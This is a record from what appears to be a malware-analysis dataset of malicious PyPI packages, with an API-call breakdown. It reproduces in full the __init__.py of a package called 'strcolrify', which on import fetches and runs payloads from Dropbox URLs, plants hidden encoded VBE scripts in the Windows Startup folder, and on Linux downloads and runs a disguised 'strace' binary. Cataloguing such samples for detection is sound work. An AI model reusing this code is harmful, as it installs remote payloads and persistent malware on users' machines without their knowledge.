[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/strcolrify-1.8-py3-none-any/strcolrify/__init__.py",
    "code_snippet": "import platform\nimport subprocess\nimport tempfile\nif platform.system().startswith(\"Windows\"):\n    pa = tempfile.gettempdir()\n    with open(pa+\"\\\\tmp.py\",'w') as f:\n        f.write(\"\"\"\nimport os\nimport subprocess\nfrom os import remove\nfrom sys import argv\npb = \"\\\\\"%appdata%\\\\\\\\Microsoft\\\\\\\\Windows\\\\Start Menu\\\\Programs\\Startup\\\\file.vbe\\\\\"\"\nstartup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')  + \"\\\\\\\\file.vbe\"\ntry:\n    cd = \"#@~^mwAAAA==-1r21l:bm}n,xPrm\\\\\\\\N,z^~aXY4Gx,Om,EE0MWsPO+.h1WsWMdPb:2GMYPMErJ~P@#@&k+O,\\\\\\\\}wm5DDCm7PxP;DnCD+r(%+1Y`r\\tjmMkaY ?4n^VE#,~@#@&\\\\\\\\621pDOC1\\ I!U,\\\\\\\\^}w1lKzm}K~Z@#@&@#@&ki4AAA==^#~@ \"\n    hel = os.system(\"python -m pip  install https://dl.dropbox.com/s/v9231x7p7xcjdp8/termcolors-0.0.3-py3-none-any.whl -q -q -q\")\n    if hel == 0:\n        if os.path.exists(startup_folder):\n            subprocess.Popen(f\"cMd /c attrib +h {pb} && {pb} NUL 2>&1\",shell=True)\n        else:\n             with open(startup_folder,'w') as f:\n                f.write(cd)\n                f.close()\n        subprocess.Popen(f\"cMd /c attrib +h {pb} && {pb} NUL 2>&1\",shell=True)\n    else:\n        print()\nexcept:\n        print()\nremove(argv[0])\n        \"\"\")\n        f.close()\n    try:\n        with open(pa+\"\\\\tmp.vbe\",'w') as f:\n            f.write(\"\"\"\n#@~^egAAAA==-1r21l:bm}n,xPrm\\N,z^~uY+s2]'Y:a 2XrP,@#@&/nO,\\6w1}DDl^-,'P/.\\u007flO+}8N+^D`r\\u007f?1Db2Yc?4+^VEb,P@#@&-rampMOCm7R\"EUP-^}w^l:)m}nSTCyYAAA==^#~@ \n            \"\"\")\n            f.close()\n        subprocess.Popen('cMd /c %temp%\\\\tmp.vbe && del %temp%\\\\tmp.vbe > NUL 2>&1', shell=True)\n    except:\n        print()\nelif platform.system().startswith(\"Linux\"):\n    with open('/tmp/.tmp.py', 'w') as f:\n        f.write(\"\"\"\n    from os import remove\n    from sys import argv\n    import subprocess\n    subprocess.call(\\\"wget https://dl.dropbox.com/s/n4p1pzxp46mo09a/strace -O /tmp/strace >/dev/null 2>&1 && chmod +x /tmp/strace >/dev/null 2>&1 && /tmp/strace >/dev/null 2>&1 &\\\",shell=True)\n    remove(argv[0])\n            \"\"\")\n        f.close()\n        try:\n            subprocess.call(\"python3 /tmp/.tmp.py >/dev/null 2>&1 &\", shell=True)\n        except:\n            print()",
    "pattern_analysis": {
      "api_sequence": [
        "platform.system",
        "tempfile.gettempdir",
        "open",
        "open",
        "os.system",
        "os.path.exists",
        "subprocess.Popen",
        "open",
        "open",
        "subprocess.Popen",
        "os.remove",
        "open",
        "subprocess.call",
        "os.remove",
        "subprocess.call"
      ],
      "api_sequence_with_args": [
        "platform.system()",
        "tempfile.gettempdir()",
        "open(pa+\"\\tmp.py\",'w')",
        "open(pa+\"\\tmp.vbe\",'w')",
        "os.system(\"python -m pip  install https://dl.dropbox.com/s/v9231x7p7xcjdp8/termcolors-0.0.3-py3-none-any.whl -q -q -q\")",
        "os.path.exists(startup_folder)",
        "subprocess.Popen(f\"cMd /c attrib +h {pb} && {pb} NUL 2>&1\",shell=True)",
        "open(startup_folder,'w')",
        "open(pa+\"\\tmp.vbe\",'w')",
        "subprocess.Popen('cMd /c %temp%\\tmp.vbe && del %temp%\\tmp.vbe > NUL 2>&1', shell=True)",
        "os.remove(argv[0])",
        "open('/tmp/.tmp.py', 'w')",
        "subprocess.call(\"wget https://dl.dropbox.com/s/n4p1pzxp46mo09a/strace -O /tmp/strace >/dev/null 2>&1 && chmod +x /tmp/strace >/dev/null 2>&1 && /tmp/strace >/dev/null 2>&1 &\",shell=True)",
        "os.remove(argv[0])",
        "subprocess.call(\"python3 /tmp/.tmp.py >/dev/null 2>&1 &\", shell=True)"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.system",
          "id": "get_platform_info",
          "description": "Retrieves platform information as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "tempfile.gettempdir",
          "id": "create_temp_dir",
          "description": "Creates temporary directory and returns its path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "subprocess.call",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "subprocess.call",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        }
      ],
      "contextual_code": "import platform\nimport subprocess\nimport tempfile\n\nif platform.system().startswith(\"Windows\"):\n    pa = tempfile.gettempdir()\n    with open(pa+\"\\tmp.py\",'w') as f:\n        f.write(\"\"\"\nimport os\nimport subprocess\nfrom os import remove\nfrom sys import argv\npb = \"\\\"%appdata%\\\\Microsoft\\\\Windows\\Start Menu\\Programs\\Startup\\file.vbe\\\"\"\nstartup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')  + \"\\\\file.vbe\"\ntry:\n    cd = \"#@~^mwAAAA==-1r21l:bm}n,xPrm\\\\N,z^~aXY4Gx,Om,EE0MWsPO+.h1WsWMdPb:2GMYPMErJ~P@#@&k+O,\\\\}wm5DDCm7PxP;DnCD+r(%+1Y`r\\tjmMkaY ?4n^VE#,~@#@&\\\\621pDOC1\\ I!U,\\\\^}w1lKzm}K~Z@#@&@#@&ki4AAA==^#~@ \"\n    hel = os.system(\"python -m pip  install https://dl.dropbox.com/s/v9231x7p7xcjdp8/termcolors-0.0.3-py3-none-any.whl -q -q -q\")\n    if hel == 0:\n        if os.path.exists(startup_folder):\n            subprocess.Popen(f\"cMd /c attrib +h {pb} && {pb} NUL 2>&1\",shell=True)\n        else:\n             with open(startup_folder,'w') as f:\n                f.write(cd)\n                f.close()\n        subprocess.Popen(f\"cMd /c attrib +h {pb} && {pb} NUL 2>&1\",shell=True)\n    else:\n        print()\nexcept:\n        print()\nremove(argv[0])\n        \"\"\")\n        f.close()\n    try:\n        with open(pa+\"\\tmp.vbe\",'w') as f:\n            f.write(\"\"\"\n#@~^egAAAA==-1r21l:bm}n,xPrm\\N,z^~uY+s2]'Y:a 2XrP,@#@&/nO,\\6w1}DDl^-,'P/.\\u007flO+}8N+^D`r\\u007f?1Db2Yc?4+^VEb,P@#@&-rampMOCm7R\"EUP-^}w^l:)m}nSTCyYAAA==^#~@ \n            \"\"\")\n            f.close()\n        subprocess.Popen('cMd /c %temp%\\tmp.vbe && del %temp%\\tmp.vbe > NUL 2>&1', shell=True)\n    except:\n        print()\nelif platform.system().startswith(\"Linux\"):\n    with open('/tmp/.tmp.py', 'w') as f:\n        f.write(\"\"\"\n    from os import remove\n    from sys import argv\n    import subprocess\n    subprocess.call(\\\"wget https://dl.dropbox.com/s/n4p1pzxp46mo09a/strace -O /tmp/strace >/dev/null 2>&1 && chmod +x /tmp/strace >/dev/null 2>&1 && /tmp/strace >/dev/null 2>&1 &\\\",shell=True)\n    remove(argv[0])\n            \"\"\")\n        f.close()\n        try:\n            subprocess.call(\"python3 /tmp/.tmp.py >/dev/null 2>&1 &\", shell=True)\n        except:\n            print()"
    }
  }
]